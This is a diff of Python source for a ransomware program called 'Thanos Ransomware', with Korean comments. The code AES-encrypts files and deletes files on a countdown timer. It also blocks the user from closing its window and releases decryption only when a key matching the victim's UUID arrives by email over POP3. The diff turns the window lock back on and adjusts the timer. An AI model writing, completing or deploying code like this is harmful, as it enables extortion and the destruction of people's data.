@@ -22,7 +22,6 @@ from PIL import Image, ImageTk
 # self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
 iv = os.urandom(16)
 
-
 def enc(key, cipher, in_filename, out_filename=None):
     ciphertext = cipher.encrypt(key)  # 128비트
     mode = AES.MODE_CBC
@@ -49,7 +48,6 @@ def enc(key, cipher, in_filename, out_filename=None):
             e_data = encryptor.encrypt(data)
             outfile.write(e_data)
 
-
 def dec(cipher, in_filename, out_filename=None):
     mode = AES.MODE_CBC
 
@@ -74,7 +72,6 @@ def dec(cipher, in_filename, out_filename=None):
             d_data = decryptor.decrypt(e_data)
             d_data = d_data[:size_of_data]
             outfile.write(d_data)
-
 
 def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
@@ -101,7 +98,6 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.listWindow.destroy()
 
     startTimer(gui, os.getcwd())  # @@
-
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -201,6 +197,8 @@ class AnimatedGIF(Label, object):
 
 class MyTk:
     def __init__(self, parent=None):
+        self.is_final_gui = False
+
         self.parent = parent
         self.pw = ""
         self.window = tkinter.Tk()
@@ -244,11 +242,9 @@ class MyTk:
                                       highlightthickness=0)
         self.l_thanos.pack()
 
-    '''
     def disable_event(self):
         messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
         pass
-'''
 
     def keySubmit(self):
         self.pw = str(self.password.get())
@@ -262,25 +258,7 @@ class MyTk:
         #self.pwbutton['state'] = 'normal'
         self.l_input.config(text=" It's the wrong key.")
 
-
-
-
     def finalGui(self):
-        print("디버깅1")
-        '''
-        self.l_timer.destroy()
-        self.l_input.destroy()
-        self.password.destroy()
-        self.pwbutton.destroy()
-        self.l_thanos.destroy()
-
-        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
-                           font='Helvetica 24 bold')
-        print("디버깅2")
-        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
-        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
-        self.l_final.pack()
-'''
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
@@ -292,10 +270,10 @@ class MyTk:
         self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
+
+        self.is_final_gui =True
         #sleep(5)
         #self.window.destroy()
-
-
 
     def allRemovePrint(self):
 
@@ -339,9 +317,10 @@ def startTimer(gui, path, ext=None):
                              font='Helvetica 14 bold')
     gui.listWindow.lift()
     gui.list.pack()
+    sleep(3)
+    gui.listWindow.destroy()
 
-    clock(gui, 10, antdd_filelist)
-
+    clock(gui, 15, antdd_filelist)
 
 def clock(gui, sec, antdd_filelist):
     sec -= 1
@@ -433,7 +412,8 @@ class RealMain:
         th1.daemon = True
         th1.start()
 
-       # self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
+        if self.myGui.is_final_gui == False:
+            self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
         self.myGui.window.mainloop()
 
     def checkPassword(self, gui_input=None):
@@ -456,10 +436,8 @@ class RealMain:
 
             # 만약 같은 주소의 사용자에게 온 메일이 있다면
             if uuid == str(self.UUID):
-                print("들어옴1")
                 # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip() == gui_input.strip():
-                    print("들어옴2")
                     # 해당 메일 삭제
                     server.dele(i + 1)
                     server.quit()
@@ -471,13 +449,9 @@ class RealMain:
                         os.remove(dec_target)
 
                     self.myGui.finalGui()
-                    #self.myGui.window.destroy()
 
 
 
 if __name__ == "__main__":
-    for i in range(5):
-        with open("test" + str(i) + '.txt', 'wb') as testfile:
-            testfile.write('테스트입니다'.encode())
     r = RealMain()
     r.run()
